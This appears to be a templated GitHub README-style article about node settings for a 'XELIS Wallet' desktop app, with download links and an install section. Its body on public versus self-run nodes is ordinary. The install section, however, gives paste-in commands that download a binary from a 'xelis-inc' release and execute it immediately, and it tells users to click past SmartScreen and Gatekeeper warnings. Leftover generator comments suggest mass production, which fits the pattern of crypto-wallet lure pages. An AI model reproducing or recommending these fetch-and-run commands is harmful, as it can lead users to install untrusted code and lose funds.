![XELIS Wallet node settings: public node or your own](assets/banner-article.png)
# XELIS Wallet node settings: public node or your own

What the node sees, what it costs you and when to run one.

## Downloads - Node

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

The node setting lives in the app, so the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1) is what you install before changing it. The release page also tells you which version you are running today.

> Switching nodes changes who serves your data. It never moves funds and never changes your address.

XELIS Wallet reads the chain through a node and does not contain one. By default it uses a public node; you can point it at a daemon you run yourself instead. A public node is the zero-setup option, while your own node removes a third party from every balance read and broadcast, at the cost of running and syncing software.

<!-- ARTICLE-BODY-BEGIN -->
## Why the wallet cannot work without a node

A wallet holds keys; the chain holds the record. The node is the machine that answers "what is this address worth" and accepts a signed transaction for broadcast. Without one, the app can open, show your address and read local data, but it cannot tell you the current balance.

The app you install from the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a> ships without a node for that reason. That separation is deliberate. It keeps the desktop app small and lets you choose who provides the chain view, which is also why the same app works on a laptop that will never store the full chain.

## What a public node can and cannot see

A node sees your IP address and the addresses you query, because it answers those requests. It does not see your recovery phrase, your local password or the keys themselves, and it cannot sign anything for you. Confidential transactions hide amounts on chain, but the connection to a node is still a network relationship with a third party.

The distinction matters if privacy is why you chose this wallet. The trade-offs are set out in <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-privacy-what-it-hides.md">what XELIS Wallet privacy covers</a>, including which parts are protected by encryption and which are simply not observable.

## Running the daemon yourself

Point the wallet at a daemon on your own machine and the chain view stops depending on someone else's uptime, region or policy. You take on the sync, the disk use and the maintenance, and you gain a connection that fails only when your own machine fails.

The setup is a two-part job: run the daemon, then tell the wallet where it is. <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-run-local-node.md">Run a local XELIS node</a> covers both halves, including what to do when the wallet still cannot reach a daemon that is clearly running.

## When a node stops answering

Node problems look exactly like wallet problems: a spinner, a stale balance, an error on send. The difference is that a node problem is fixed by changing the endpoint, not by reinstalling. The ordered checks, including what a healthy reconnect looks like, are in <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-not-syncing-not-connecting-fix.md">fix XELIS Wallet not syncing</a>.

Keep more than one endpoint in mind. A public node that worked last month may be down today, and knowing a second address turns a dead end into a two-minute fix.

## FAQ

### Which node should I connect to?

A public node if you want zero setup, your own daemon if you want the connection under your control. Both work; the difference is trust and maintenance.

### Can you confirm a specific public node is online?

No. Node availability is run by whoever operates it and changes without notice. The check is to connect and watch the sync, then switch if it fails.

### Does the node see my balance?

It answers queries about addresses you ask for, so it can correlate your IP with those addresses. It cannot read encrypted amounts or your keys.

### Will changing the node affect my wallet?

No. Keys, address and history stay the same; only the machine serving the chain view changes.

### Do I need a node to receive XEL?

No. The payment reaches the chain regardless; you need a node to see it in the wallet.

<!-- ARTICLE-BODY-END -->

## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [Run a local XELIS node](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-run-local-node.md)
- [Fix XELIS Wallet not syncing](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-not-syncing-not-connecting-fix.md)
- [What XELIS Wallet privacy covers](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-privacy-what-it-hides.md)
- [Read the XELIS Wallet logs](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-logs-report-bug.md)
- [Current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1)
